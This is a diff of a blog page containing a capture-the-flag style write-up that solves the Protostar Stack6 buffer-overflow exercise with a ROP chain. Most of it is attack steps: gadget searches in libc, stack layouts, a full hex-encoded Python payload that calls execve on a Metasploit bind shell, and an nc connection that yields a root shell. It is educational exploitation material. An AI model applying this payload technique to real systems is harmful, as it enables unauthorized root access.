@@ -51,10 +51,37 @@
                         </p>
                 </header>
             </section>
-            <p>I've recently been revisiting the <a href="https://exploit-exercises.com/protostar/">Protostar</a> challenges from <a href="https://exploit-exercises.com/">Exploit Exercises</a>. Having prevously only completed the <a href="https://exploit-exercises.com/protostar/stack6/">Stack6</a> challenge using the duplicate payload and <a href="http://goo.gl/Tg1MN9">return-to-libc</a> methods suggested in the description, I thought I would run through a ROP solution and write up the steps as I go.</p>
+            <p>I've recently been revisiting the <a href="https://exploit-exercises.com/protostar/">Protostar</a> challenges from <a href="https://exploit-exercises.com/">Exploit Exercises</a>. Having previously only completed the <a href="https://exploit-exercises.com/protostar/stack6/">Stack6</a> challenge using the duplicate payload and <a href="http://goo.gl/Tg1MN9">return-to-libc</a> methods suggested in the description, I thought I would run through a ROP solution and write up the steps as I go.</p>
 <p>I'll skip any introduction to ROP for now as there's plenty of <a href="https://goo.gl/trusVL">other reading material</a> already available.</p>
 <p>The source code for the challenge is as follows:</p>
-<div class="highlight"><pre><span class="cp">#include &lt;stdlib.h&gt;</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28</pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdlib.h&gt;</span>
 <span class="cp">#include &lt;unistd.h&gt;</span>
 <span class="cp">#include &lt;stdio.h&gt;</span>
 <span class="cp">#include &lt;string.h&gt;</span>
@@ -83,45 +110,55 @@
   <span class="n">getpath</span><span class="p">();</span>
 <span class="p">}</span>
 </pre></div>
-
+</td></tr></table>
 
 <p>The basic idea is pretty straight forward; exploit the program to get arbitrary code execution. However, we can see that there are some restrictions on the return address that can be used.</p>
 <p>As suggested in the description, there are multiple ways around this restriction, but we will just look at ROP.</p>
 <h2>Controlling EIP</h2>
 <p>Before we do anything else, let's start off by gaining control over EIP. We'll use Metasploit's <code>pattern_create</code> and <code>pattern_offset</code> tools to help us figure this one out.</p>
-<div class="highlight"><pre>root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 100 &gt; inputroot@kali:~# gdb -q ./stack6
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11</pre></div></td><td class="code"><div class="highlight"><pre>root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 100 &gt; input
+root@kali:~# gdb -q ./stack6
 Reading symbols from /root/stack6...done.
 gdb$ r &lt; input
 input path please: got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
 Program received signal SIGSEGV, Segmentation fault.
---------------------------------------------------------------------------[regs]
-  EAX: 0x0000006E  EBX: 0xF7FBBFF4  ECX: 0xFFFFD408  EDX: 0xF7FBD360  o d I t S z A P c 
-  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x63413563  ESP: 0xFFFFD490  EIP: 0x37634136
-  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
-Cannot access memory at address 0x37634136
 0x37634136 in ?? ()
 gdb$ q
 root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37634136
 [*] Exact match at offset 80
 </pre></div>
-
+</td></tr></table>
 
 <p>Now we know that we need a payload with 80 bytes before we overwrite the return address of the <code>getpath()</code> function with the next 4 bytes.</p>
 <h2>Plan</h2>
 <p>Now let's do some planning. Our goal will be to use a ROP chain to execute a TCP bind shell. We will use Metasploit to generate our bind shell and copy it over to the target as <code>/tmp/pwn</code>:</p>
-<div class="highlight"><pre>root@kali:~# msfpayload linux/x86/shell_bind_tcp X &gt; linux-bind-shell-tcp
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="highlight"><pre>root@kali:~# msfpayload linux/x86/shell_bind_tcp X &gt; linux-bind-shell-tcp
 Created by msfpayload (http://www.metasploit.com).
 Payload: linux/x86/shell_bind_tcp
  Length: 78
 Options: {}
 </pre></div>
-
+</td></tr></table>
 
 <p>We will cause the target program to execute the bind shell with the following command:</p>
-<div class="highlight"><pre><span class="n">execv</span><span class="p">(</span><span class="s">&quot;/tmp/pwn&quot;</span><span class="p">,</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">},</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">})</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span class="n">execv</span><span class="p">(</span><span class="s">&quot;/tmp/pwn&quot;</span><span class="p">,</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">},</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">})</span>
 </pre></div>
-
+</td></tr></table>
 
 <p>Let's break this down into steps:</p>
 <ol>
@@ -137,10 +174,11 @@ Options: {}
 <h3>Getting our arguments into memory</h3>
 <p>First we need to get the arguments to the <code>execve</code> call into memory. The first argument will point to the string <code>"/bin/pwn"</code>. We can just use a <code>NULL</code> for the second and third parameters.</p>
 <p>We could just pass the parameters in on the stack as arguments to the program, but the address of the arguments would be liable to change even without ASLR. Intead, we will pass them in as part of our buffer and arrange them in memory ourselves. We will use the <code>.data</code> section to store these parameters:</p>
-<div class="highlight"><pre>user@protostar:~$ objdump -D /opt/protostar/bin/stack6 | grep __data
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2</pre></div></td><td class="code"><div class="highlight"><pre>user@protostar:~$ objdump -D /opt/protostar/bin/stack6 | grep __data
 08049710 &lt;__data_start&gt;:
 </pre></div>
-
+</td></tr></table>
 
 <p>Now we need some ROP gadgets. There's a tool for those, or rather a number of tools for those.</p>
 <p>I'm going to go ahead and use <code>rp</code> from <a href="https://github.com/0vercl0k/rp">here</a> because I can use a precompiled binary to avoid any dependency issues and because I'm a C++ fan.</p>
@@ -152,7 +190,18 @@ Options: {}
 <li>Repeat steps 1 and 2 for successive 4 byte chunks, updating the address <code>[r2]</code> each time. We can also add a <code>NULL</code> on the end to terminate the string and provide the <code>NULL</code> for arguments two and three of the call to <code>execve</code>.</li>
 </ol>
 <p>Let's look for these gadgets. There's not alot to go on in the <code>stack6</code> binary itself, so we look in <code>libc</code> as this is also linked in. We'll start with the <code>mov</code>, so we an identify which register we need to pop into, then the two <code>pop</code> gadgets.</p>
-<div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &quot; mov dword \[ecx\]&quot;
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12</pre></div></td><td class="code"><div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &quot; mov dword \[ecx\]&quot;
 ...
 0x00074997: mov dword [ecx], edx ; ret  ;  (1 found)
 ...
@@ -165,10 +214,38 @@ user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &q
 0x0013519d: pop ecx ; ret  ;  (1 found)
 ...
 </pre></div>
-
+</td></tr></table>
 
 <p>We can get the absolute address of this by adding it to the base address of <code>libc</code> which we can get from <code>/proc/&lt;pid&gt;/maps</code> as shown below.  </p>
-<div class="highlight"><pre>user@protostar:~$ gdb -q /opt/protostar/bin/stack6
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29</pre></div></td><td class="code"><div class="highlight"><pre>user@protostar:~$ gdb -q /opt/protostar/bin/stack6
 Reading symbols from /opt/protostar/bin/stack6...done.
 gdb$ b main
 Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
@@ -198,10 +275,37 @@ b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
 b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
 bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 </pre></div>
-
+</td></tr></table>
 
 <p>We need to setup our stack as follows using the <code>libc</code> base of <code>0xb7e97000</code>. </p>
-<div class="highlight"><pre>&lt;lower memory&gt;
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28</pre></div></td><td class="code"><div class="highlight"><pre>&lt;lower memory&gt;
 ...
 # Load the target address in .data
     0xb7fcc19d &lt;- Return address (pop ecx; ret)
@@ -230,19 +334,30 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 ...
 &lt;higher memory&gt;
 </pre></div>
-
+</td></tr></table>
 
 <h3>Setting up the registers</h3>
 <p>Next step it to place the arguments in the three registers <code>ebx</code>, <code>ecx</code> and <code>edx</code>, so we need to find a <code>pop</code> for each.</p>
-<div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep &quot; pop ebx&quot; --color
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4</pre></div></td><td class="code"><div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep &quot; pop ebx&quot; --color
 ...
 0x000d8a81: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
 ...
 </pre></div>
-
+</td></tr></table>
 
 <p>Here we've found all three in a single gadget. Awesome! Let's add the following to our stack layout.</p>
-<div class="highlight"><pre>&lt;lower memory&gt;
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9</pre></div></td><td class="code"><div class="highlight"><pre>&lt;lower memory&gt;
 ...
 # Load registers
     0xb7f6fa81 &lt;- Return address (pop edx; pop ecx; pop ebx; ret)
@@ -252,19 +367,56 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 ...
 &lt;higher memory&gt;
 </pre></div>
-
+</td></tr></table>
 
 <h3>Calling <code>execve</code></h3>
 <p>We need two more gadgets to load the system call number into eax and to envoke it. Luckily for us, <code>libc</code> contains a gadget that serves both purposes:</p>
-<div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &quot;0x0000000B&quot; ; int 0x80&quot;
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4</pre></div></td><td class="code"><div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &quot;0x0000000B&quot; ; int 0x80&quot;
 ...
 0x00097193: mov eax, 0x0000000B ; int 0x80 ;  (1 found)
 ...
 </pre></div>
-
+</td></tr></table>
 
 <p>Our finished stack layout should look like this:</p>
-<div class="highlight"><pre>&lt;lower memory&gt;
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35</pre></div></td><td class="code"><div class="highlight"><pre>&lt;lower memory&gt;
 ...
 # Load the target address in .data
     0xb7fcc19d &lt;- Return address (pop ecx; ret)
@@ -300,20 +452,25 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 ...
 &lt;higher memory&gt;
 </pre></div>
-
+</td></tr></table>
 
 <p>This now gives us the following payload:</p>
-<div class="highlight"><pre>user@protostar:~$ python -c &#39;print &quot;A&quot;*80 + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x10\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;/tmp&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x14\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;/pwn&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;\x00\x00\x00\x00&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x81\xfa\xf6\xb7&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x10\x97\x04\x08&quot; + &quot;\x93\xe1\xf2\xb7&quot;&#39; &gt; input
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="highlight"><pre>user@protostar:~$ python -c &#39;print &quot;A&quot;*80 + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x10\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;/tmp&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x14\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;/pwn&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;\x00\x00\x00\x00&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x81\xfa\xf6\xb7&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x10\x97\x04\x08&quot; + &quot;\x93\xe1\xf2\xb7&quot;&#39; &gt; input
 user@protostar:~$ cat input | /opt/protostar/bin/stack6
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA������/tmp��������/pwn�������
 </pre></div>
-
+</td></tr></table>
 
 <p>And from another shell:</p>
-<div class="highlight"><pre>$ nc 192.168.94.133 4444
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="highlight"><pre>$ nc 192.168.94.133 4444
 whoami
 root
 </pre></div>
+</td></tr></table>
             <div class="hr"></div>
             <a href="#" class="go-top">Go Top</a>
 <footer class="footer">
